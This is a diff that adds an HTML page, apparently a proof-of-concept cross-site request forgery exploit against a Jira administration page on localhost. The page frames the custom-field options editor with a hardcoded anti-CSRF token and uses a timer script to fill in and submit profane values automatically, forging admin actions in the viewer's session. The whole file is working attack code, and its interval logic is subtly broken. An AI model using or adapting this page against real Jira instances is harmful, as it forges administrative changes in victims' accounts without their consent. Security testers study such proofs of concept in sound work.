@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+ <head>
+ 	<meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+ 	<script>
+	  flag = true;
+	  var i = 0;
+	  function createFrames()
+	  {
+	    values = ["Fuck", "Cunt", "Jigurda"];
+
+	    if (flag) {
+	      interval = setInterval(function()
+	      {
+		    frames[0].document.getElementsByName("addValue")[0].value = values[i];
+		    frames[0].document.getElementById("add_submit").click();
+		    i++;
+		    if(i > values.length - 1)
+		      flag = false;
+		      clearInterval(interval);
+	      }, 2000);
+	    }
+	  }
+ 	</script>
+ 	<style>
+	  .siteFrame {
+	    border: none;
+	    width: 100%;
+	    height: 768px;
+	  }
+ 	</style>
+ </head>
+ <body>
+ 	<iframe onload=createFrames() class="siteFrame" id="siteFrameId" src="http://localhost:8080/secure/admin/EditCustomFieldOptions!default.jspa?atl_token=BWGL-8TWI-XBT7-MW0K|d4e7b77c6d66a407028e0ef040ab277f7617961b|lin&fieldConfigSchemeId=10200&fieldConfigId=10200&customFieldId=10100&returnUrl=ConfigureCustomField!default.jspa%3FcustomFieldId%3D10100"></iframe>
+ </body>
+</html>
